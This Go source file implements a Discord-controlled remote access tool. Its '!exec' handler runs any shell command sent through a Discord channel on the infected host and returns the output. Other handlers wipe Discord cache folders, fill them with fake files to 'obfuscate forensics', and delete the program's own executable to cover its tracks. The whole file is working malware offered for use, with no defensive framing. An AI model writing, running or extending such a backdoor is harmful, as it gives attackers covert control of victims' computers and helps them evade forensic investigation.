package main

import (
	"fmt"     // formatted I/O
	"os"      // file operations
	"os/exec" // command exec ;)
	"path/filepath"
	"runtime" // OS detection
	"strings" // string manipulation
	"time"

	"github.com/bwmarrin/discordgo" // discord library. Run go get github.com/bwmarrin/discordgo
)

var currentShell string // Track current shell preference

func main() {
	// Set default shell based on OS
	if runtime.GOOS == "windows" {
		currentShell = "powershell"
	} else {
		currentShell = "/bin/sh"
	}

	botToken := "AUTHENTICATION_TOKEN"
	discord, err := discordgo.New("Bot " + botToken)
	if err != nil {
		fmt.Println("Error creating Discord session: ", err)
		return
	}
	discord.AddHandler(newMessage)
	err = discord.Open()
	if err != nil {
		fmt.Println("Error opening connection: ", err)
		return
	}
	fmt.Println("Bot is running. Press CTRL+C to exit.")
	select {} // Block forever
}

func newMessage(s *discordgo.Session, m *discordgo.MessageCreate) {
	// Ignore messages from the bot itself
	if m.Author.ID == s.State.User.ID {
		return
	}

	// Parse command (e.g., "!exec dir" or "!exec ls -la")
	if strings.HasPrefix(m.Content, "!exec ") {
		cmdStr := strings.TrimPrefix(m.Content, "!exec ")
		output := executeCommand(cmdStr)

		// Discord messages have a 2000 character limit
		if len(output) > 1900 {
			output = output[:1900] + "\n...(truncated)"
		}

		s.ChannelMessageSend(m.ChannelID, "```\n"+output+"\n```")
	} else if strings.HasPrefix(m.Content, "!shell ") {
		shellName := strings.TrimPrefix(m.Content, "!shell ")
		output := setShell(shellName)
		s.ChannelMessageSend(m.ChannelID, output)
	} else if m.Content == "!shell" {
		s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("Current shell: `%s`\n\nAvailable shells:\n- Windows: `powershell`, `cmd`\n- Linux/macOS: `/bin/sh`, `/bin/bash`", currentShell))
	} else if m.Content == "!clearcache" {
		output := clearDiscordCache()
		s.ChannelMessageSend(m.ChannelID, output)
	} else if m.Content == "!poisoncache" {
		output := poisonDiscordCache()
		s.ChannelMessageSend(m.ChannelID, output)
	} else if m.Content == "!selfdestruct" {
		s.ChannelMessageSend(m.ChannelID, "Initiating self-destruct sequence...")
		time.Sleep(2 * time.Second)
		selfDestruct()
	}
}

func executeCommand(cmdStr string) string {
	if cmdStr == "" {
		return "Error: No command provided"
	}

	var cmd *exec.Cmd

	// Execute command using selected shell
	switch currentShell {
	case "powershell":
		cmd = exec.Command("powershell.exe", "-c", cmdStr)
	case "cmd":
		cmd = exec.Command("cmd.exe", "/C", cmdStr)
	case "/bin/bash":
		cmd = exec.Command("/bin/bash", "-c", cmdStr)
	case "/bin/sh":
		cmd = exec.Command("/bin/sh", "-c", cmdStr)
	default:
		// Fallback to OS default
		if runtime.GOOS == "windows" {
			cmd = exec.Command("powershell.exe", "-c", cmdStr)
		} else {
			cmd = exec.Command("/bin/sh", "-c", cmdStr)
		}
	}

	// Capture both stdout and stderr
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Error executing command: %v\nOutput: %s", err, string(output))
	}

	return string(output)
}

func setShell(shellName string) string {
	validShells := map[string]bool{
		"powershell": runtime.GOOS == "windows",
		"cmd":        runtime.GOOS == "windows",
		"/bin/sh":    runtime.GOOS != "windows",
		"/bin/bash":  runtime.GOOS != "windows",
	}

	if valid, exists := validShells[shellName]; !exists || !valid {
		return fmt.Sprintf("❌ Invalid shell '%s' for this OS. Use !shell to see available options.", shellName)
	}

	currentShell = shellName
	return fmt.Sprintf("✓ Shell changed to: `%s`", currentShell)
}

func clearDiscordCache() string {
	var cachePaths []string

	if runtime.GOOS == "windows" {
		// Windows Discord cache locations
		userProfile := os.Getenv("APPDATA")
		cachePaths = []string{
			filepath.Join(userProfile, "discord", "Cache", "Cache_Data"),
			filepath.Join(userProfile, "discord", "Code Cache"),
			filepath.Join(userProfile, "discord", "GPUCache"),
		}
	} else {
		// Linux/macOS cache locations
		home := os.Getenv("HOME")
		cachePaths = []string{
			filepath.Join(home, ".config", "discord", "Cache", "Cache_Data"),
			filepath.Join(home, ".config", "discord", "Code Cache"),
			filepath.Join(home, ".config", "discord", "GPUCache"),
		}
	}

	results := []string{}
	for _, path := range cachePaths {
		if err := os.RemoveAll(path); err != nil {
			results = append(results, fmt.Sprintf("✗ %s: %v", path, err))
		} else {
			results = append(results, fmt.Sprintf("✓ Cleared: %s", path))
		}
	}

	return strings.Join(results, "\n")
}

func poisonDiscordCache() string {
	var cacheDir string

	if runtime.GOOS == "windows" {
		userProfile := os.Getenv("APPDATA")
		cacheDir = filepath.Join(userProfile, "discord", "Cache", "Cache_Data")
	} else {
		home := os.Getenv("HOME")
		cacheDir = filepath.Join(home, ".config", "discord", "Cache", "Cache_Data")
	}

	// First, clear existing cache
	os.RemoveAll(cacheDir)
	os.MkdirAll(cacheDir, 0755)

	// Create fake cache files with random data to obfuscate forensics
	fakeFiles := []string{"f_000001", "f_000002", "f_000003", "data_0", "data_1"}
	for _, fname := range fakeFiles {
		path := filepath.Join(cacheDir, fname)
		// Write random-looking but benign data
		fakeData := []byte(fmt.Sprintf("FAKE_DATA_%d\x00\x00\x00\x00", time.Now().Unix()))
		if err := os.WriteFile(path, fakeData, 0644); err != nil {
			return fmt.Sprintf("Failed to poison cache: %v", err)
		}
	}

	return fmt.Sprintf("✓ Cache poisoned at: %s", cacheDir)
}

func selfDestruct() {
	// Get current executable path
	exePath, err := os.Executable()
	if err != nil {
		return
	}

	if runtime.GOOS == "windows" {
		// Windows: Use cmd to delete after exit
		// /C = run command and terminate
		// ping creates a delay, then del removes the file
		cmd := exec.Command("cmd.exe", "/C", "ping 127.0.0.1 -n 2 > nul && del /F /Q \""+exePath+"\"")
		cmd.Start()
	} else {
		// Linux/macOS: Use shell script to delete after exit
		cmd := exec.Command("/bin/sh", "-c", "sleep 2 && rm -f \""+exePath+"\"")
		cmd.Start()
	}

	// Exit the program
	os.Exit(0)
}
